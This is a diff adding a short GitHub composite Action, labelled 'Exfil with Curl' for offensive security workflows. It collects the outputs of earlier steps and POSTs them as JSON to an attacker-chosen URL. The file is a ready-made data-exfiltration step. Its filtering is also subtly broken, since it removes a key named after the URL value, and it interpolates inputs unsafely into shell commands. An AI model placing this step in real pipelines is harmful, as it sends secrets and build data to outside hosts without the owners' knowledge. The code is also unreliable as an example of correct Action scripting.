@@ -1,0 +1,18 @@
+name: '"Exfil with Curl" Action for Offensive Security Workflows'
+description: 'Takes inputs from previous steps and uses curl to POST the content to a url'
+
+inputs:
+  url:
+    description: 'The url to POST the payload to'
+    required: true
+
+runs:
+  using: 'composite'
+  steps:
+    - name: POST with curl
+      run: |
+        INPUTS_JSON=$(jq -n --argjson inputs "${{ toJson(inputs) }}" '$inputs')
+        EXCLUDE_INPUT=${{ inputs.url }}
+        FILTERED_JSON=$(echo "$INPUTS_JSON" | jq "del(.\"$EXCLUDE_INPUT\")")
+        echo "Filtered payload: $FILTERED_JSON"
+        curl -X POST -H "Content-Type: application/json" -d "$FILTERED_JSON" "${{ inputs.url }}"
